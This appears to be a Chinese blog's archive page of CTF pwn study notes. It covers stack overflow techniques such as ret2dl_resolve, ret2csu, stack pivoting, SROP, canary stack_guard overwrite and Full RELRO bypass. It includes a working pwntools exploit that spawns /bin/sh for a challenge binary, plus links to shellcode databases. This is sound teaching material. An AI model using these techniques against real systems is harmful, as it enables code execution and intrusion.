+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    try:</span><br><span class="line">		<span class="comment">// p = process()</span></span><br><span class="line">		<span class="comment">// pass</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        print(p.recvline())</span><br><span class="line">        p.close()</span><br><span class="line">    except BaseException as e:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="comment">// pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>采用grep 获取输出包含flag的行就行</p>
+<h4 id="ret2dl-resolve">ret2dl_resolve()</h4>
+<p>延迟绑定会使用_dl_resolve()函数</p>
+<ul>
+<li>
+<p>_dl_resolve中</p>
+<p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p>
+<ol>
+<li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li>
+<li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li>
+<li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li>
+<li>检查r_info</li>
+<li>检查&amp;(Elf64_Sym)-&gt;st_other</li>
+<li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li>
+</ol>
+</li>
+</ul>
+<p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"></th>
+<th style="text-align:left">修改 dynamic 节的内容</th>
+<th style="text-align:left">修改重定位表项的位置</th>
+<th style="text-align:left">伪造 linkmap</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">主要前提要求</td>
+<td style="text-align:left">无</td>
+<td style="text-align:left">无</td>
+<td style="text-align:left">无信息泄漏时需要 libc</td>
+</tr>
+<tr>
+<td style="text-align:left">适用情况</td>
+<td style="text-align:left">NO RELRO</td>
+<td style="text-align:left">NO RELRO, Partial RELRO</td>
+<td style="text-align:left">NO RELRO, Partial RELRO</td>
+</tr>
+<tr>
+<td style="text-align:left">注意点</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>
+<td style="text-align:left">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Tricks">Tricks</h3>
+<h4 id="ret2csu">ret2csu</h4>
+<p>csu主要是为了控制rdx，一般如果gadget较少， 可能没有直接rdx，<br>
+一个典型的csu如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400940</span> loc_400940:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400940</span>                 mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400943</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400946</span>                 mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400949</span>                 call    ds:(__frame_dummy_init_array_entry - <span class="number">600</span>D90h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040094</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400951</span>                 cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400954</span>                 jnz     <span class="type">short</span> loc_400940</span><br><span class="line">.text:<span class="number">0000000000400956</span></span><br><span class="line">.text:<span class="number">0000000000400956</span> loc_400956:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400956</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040095</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040095B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040095</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040095</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400960</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400962</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400964</span>                 retn</span><br></pre></td></tr></table></figure>
+<p>那么通过0x400956和0x400940的组合，就可以控制rdx 了。<br>
+将r12+rbx*8 控制为一个无效got表项，并且令rbx比rbp大1，就可以循环劫持控制流了。</p>
+<h4 id="stack-pivoting">stack pivoting</h4>
+<p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;leave 相当于:</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class="line">;leave两次之后，就可以将栈转移到目的地址</span><br><span class="line">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure>
+<p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p>
+<p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p>
+<ul>
+<li>在第一次read读入后将rbp改为要写入的位置</li>
+<li>ret到read</li>
+<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>
+<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>
+</ul>
+<h5 id="example">example</h5>
+<p>一个程序反汇编后:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And you must print first.&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p>
+<p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p>
+<p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ezrop&#x27;</span>)</span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./ezrop&#x27;)</span></span><br><span class="line"></span><br><span class="line">m = u64(p.recv(<span class="number">40</span>)[-<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x400863</span>) + <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(<span class="number">0x400600</span>)</span><br><span class="line"></span><br><span class="line">payloads += cyclic(<span class="number">0x18</span>)</span><br><span class="line">payloads += p64(<span class="number">0x601848</span>+<span class="number">0x30</span>) + p64(<span class="number">0x4007d9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x4006fa</span>) + p64(<span class="number">0x400863</span>) + p64(<span class="number">0x601868</span>) + p64(<span class="number">0x400600</span>) </span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += p64(<span class="number">0x601848</span>-<span class="number">0x8</span>) + p64(<span class="number">0x4007f9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00007f7b3ce92bb0      0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure>
+<h4 id="栈对齐">栈对齐</h4>
+<p>栈对齐是xmm指令的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p>
+<p>这个特性来源于xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p>
+<p>可以:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -c core</span><br></pre></td></tr></table></figure>
+<p>调试core文件</p>
+<p>如果终止指令类似于:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0</span><br></pre></td></tr></table></figure>
+<p>说明是栈对齐的原因，小心调整栈帧就行</p>
+<h4 id="Stack-smash">Stack smash</h4>
+<p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p>
+<p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0]  (在栈上，和环境变脸在一起)指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p>
+<h4 id="SROP">SROP</h4>
+<h5 id="前置知识-2">前置知识:</h5>
+<p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p>
+<p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p>
+<p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p>
+<p>SROP简要流程:</p>
+<ol>
+<li>构造fake_frame</li>
+<li>控制当前rsp指向fake_frame底部</li>
+<li>sigreturn调用</li>
+</ol>
+<p>sigFrame结构如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h5 id="pwntools-srop">pwntools.srop</h5>
+<p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 一个简单的例子</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure>
+<h4 id="stack-gaurd">stack_gaurd</h4>
+<p>我们都知道canary来自<code>fs:0x28</code>， <code>fs</code> 实际上指向的是<a target="_blank" rel="noopener" href="http://www.openwall.com/lists/oss-security/2018/02/27/5">TCB</a> ， TCB结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;                <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;                <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;  <span class="comment">// not in 32bit</span></span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
+<p>0x28的偏移实际上是指向的stack_guard</p>
+<p>那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择<code>pthread_self()</code> 来查看<code>fs</code>的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_t</span></span><br><span class="line"><span class="title function_">pthread_self</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">pthread_t</span>) THREAD_SELF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在gdb中查看这个地址，发现这个地址实际上在libc的附近。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())</span><br><span class="line">p/x (void*)(pthread_self())</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9f000     0x7ffff7fa9000 rw-p     a000      0 [anon_7ffff7f9f]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc8000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fc8000     0x7ffff7fca000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fca000     0x7ffff7fcb000 r--p     1000      0 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7fcb000     0x7ffff7ff1000 r-xp    26000   1000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  27000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  30000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  32000 /usr/lib64/ld-linux-x86-64.so.2</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x (void*)(pthread_self())</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">16 = 0x7ffff7fa8680</span></span><br></pre></td></tr></table></figure>
+<p>如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。</p>
+<p>但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程<code>fs</code> 寄存器地址的，所以可以通过此来实现覆盖。</p>
+<h4 id="bypass-Full-RELRO">bypass Full RELRO</h4>
+<p>在没有leak函数，并且Full RELRO 的情况下， ret2dl_resolve就无法使用了。</p>
+<p>因为got不再可写，partial overwrite也无法再使用。</p>
+<p>那么可以找数据移动的gadget将got 表里面的值读入bss段，然后对bss段上的值进行partial overwrite， 或者通过add、sub等gadget拼出目标libc值，再栈迁移到bss段， 就可以ret到lbss段上的libc地址，从而劫持控制流。</p>
+<h3 id="vsyscall-vdso">vsyscall/vdso</h3>
+<p>vsyscall 和 vdso 都是内核留下的用于加速系统调用的接口，也因此，其根据内核版本的不同而有所不同。</p>
+<p>可以随便开一个程序看一下他们各自的加载地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="number">0x7ffff7fc4000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fca000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"> </span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span>      <span class="number">0</span> [vsyscall]</span><br></pre></td></tr></table></figure>
+<p>先来说vsyscall, 里面实现了三个函数：</p>
+<p>0xffffffffff600000, gettimeofday<br>
+0xffffffffff600400, time<br>
+0xffffffffff600800, getcpu</p>
+<p>并且vsyscall 的加载地址是固定的，但是由于其执行有检查，必须从以上三个函数开始的地址来运行，所以也就只能执行以上三个函数，更多的作用是在栈溢出完全无leak时，将此作为gadget滑块，让程序运行到有效libc地址。</p>
+<p>不过，在许多发行版中，这个功能已经被裁剪。</p>
+<p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/615809/">vDSO</a></p>
+<p>相对而言灵活很多，他类似与一个共享库，如果你用gdb将其dump下来，会发现他甚至有完整的ELF结构。</p>
+<p>然而，其加载地址却会受到随机化的影响，在32位的程序中，这个随机化的偏移是可爆破的程度，然而在64位的系统中，就完全不可能了。</p>
+<p>不过在loader在加载过程中会在栈上留下其地址，在所有环境变量的上面一点的偏移，如果存在leak，就可以劫持。</p>
+<p>不过，一个更大的问题的，由于这是内核提供的一个接口，vDSO具体内容随内核版本有所不同，除非你能dump出远程的vDSO，否则很难利用。</p>
+
+            
+          </div>
+          <div class="archive-post-info">
+            <time class="archive-post-time">
+              2022-08-03
+            </time>
+            <a  class="archive-post-link" href="/Pwn.Stack-Overflow-Overview/">
+              Pwn.StackOverflow-Overview
+            </a>
+          </div>
+        </div>
+      
+        
+          </section>
+        
+        <div class="archive-post">
+          <div class="archive-post-content">
+            
+              <h1 id="Basic">Basic</h1>
+<p>首先给出两个常用shellcode仓库，可以检索需要的shellcode</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">shellcode database</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">exploit-db</a></li>
+</ul>
+<p>接下来给出几个尽可能短的shellcode</p>
